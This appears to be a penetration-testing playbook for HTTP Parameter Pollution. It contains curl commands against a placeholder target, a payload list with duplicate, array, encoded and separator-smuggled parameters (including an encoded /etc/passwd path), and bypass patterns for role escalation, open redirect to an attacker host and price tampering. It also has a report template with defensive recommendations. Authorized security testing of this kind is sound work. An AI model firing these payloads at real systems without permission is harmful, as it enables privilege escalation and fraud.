# HTTP Parameter Pollution (HPP) Payloads

## Overview
HPP abuses duplicate or ambiguous parameters to bypass validation, override
values, or trigger inconsistent parsing between proxies, WAFs, and apps.

## Prerequisites
```bash
apt-get install -y jq
```

## Phase 1: Identify Candidate Endpoints
```bash
# Look for endpoints with sensitive parameters
# Examples: id, user, role, redirect, price, amount, filter, sort, next, return

# If you have URL lists
rg -n "\?|&" /workspace/output/urls.txt \
  | tee /workspace/output/TARGET_hpp_candidates.txt
```

## Phase 2: Determine Parameter Precedence
```bash
TARGET_URL="https://TARGET/endpoint"

# Marker values to see which wins
curl -s "$TARGET_URL?role=user&role=admin" \
  | tee /workspace/output/TARGET_hpp_precedence_1.txt

curl -s "$TARGET_URL?role=admin&role=user" \
  | tee /workspace/output/TARGET_hpp_precedence_2.txt

# If reflections exist
rg -n "user|admin" /workspace/output/TARGET_hpp_precedence_*.txt \
  > /workspace/output/TARGET_hpp_precedence_hits.txt
```

## Phase 3: Payload List
```bash
cat > /workspace/output/TARGET_hpp_payloads.txt <<'PAYLOADS'
# Duplicate parameters (last-wins vs first-wins)
param=1&param=2
param=2&param=1

# Array-style parameters (framework-dependent)
param[]=1&param[]=2
param[0]=1&param[1]=2
param[a]=1&param[b]=2

# Mixed encoding
param=1&param=%32
param=%31&param=2
param=%2fetc%2fpasswd&param=ok

# Separator smuggling (server-specific)
param=1;param=2
param=1|param=2
param=1,param=2

# Query vs body conflict
# GET: ?role=user  + POST body role=admin
role=user
role=admin

# JSON body override
{"param":1,"param":2}
PAYLOADS
```

## Phase 4: Query vs Body Overrides
```bash
# Send param in query and body
curl -s -X POST "$TARGET_URL?role=user" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "role=admin" \
  | tee /workspace/output/TARGET_hpp_qs_body.txt

# JSON vs query
curl -s -X POST "$TARGET_URL?role=user" \
  -H "Content-Type: application/json" \
  --data '{"role":"admin"}' \
  | tee /workspace/output/TARGET_hpp_qs_json.txt
```

## Phase 5: Path Parameter Smuggling
```bash
# Some servers parse ';' parameters in path
curl -s "https://TARGET/endpoint;role=admin" \
  | tee /workspace/output/TARGET_hpp_path_semicolon.txt
```

## Phase 6: Validation Bypass Patterns
```bash
# Example: allowlist checks first value but app uses last value
# role=allowed&role=admin
# redirect=https://trusted.com&redirect=https://ATTACKER
# price=10&price=1
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Parameter override via duplicates
- [ ] Query/body precedence mismatch
- [ ] Validation bypass via array or separator smuggling

## Evidence
- Precedence: /workspace/output/TARGET_hpp_precedence_1.txt
- Query vs body: /workspace/output/TARGET_hpp_qs_body.txt

## Recommendations
1. Reject duplicate parameters or enforce strict schema
2. Normalize parsing across proxy/WAF/app layers
3. Validate inputs after normalization and canonicalization
```

## Output Files
- `/workspace/output/TARGET_hpp_candidates.txt` — candidate endpoints
- `/workspace/output/TARGET_hpp_payloads.txt` — payload list
- `/workspace/output/TARGET_hpp_precedence_1.txt` — precedence test
- `/workspace/output/TARGET_hpp_qs_body.txt` — query vs body test

indicators: http parameter pollution, hpp, parameter pollution, duplicate parameters, array parameters
